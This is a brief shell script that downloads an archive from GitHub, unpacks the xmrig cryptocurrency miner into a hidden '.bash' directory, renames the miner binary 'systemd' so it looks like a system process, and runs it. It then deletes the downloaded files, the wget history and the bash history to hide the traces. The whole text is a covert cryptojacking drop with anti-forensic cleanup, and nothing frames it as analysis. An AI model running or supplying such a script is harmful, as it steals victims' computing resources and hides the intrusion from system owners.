wget https://github.com/deusveritatis/configs/archive/master.zip
unzip master.zip
cd configs-master
tar -xvzf ./bash.tar.gz
mv ./xmrig-2.10.0 ./.bash
mv ./config.json ./.bash/config.json
cd .bash/
mv ./xmrig ./systemd
./systemd
cd ../..
rm -r master.zip
rm -r ./configs-master
rm ./nv3v2
rm .wget-hsts
rm .bash_history && history && exit


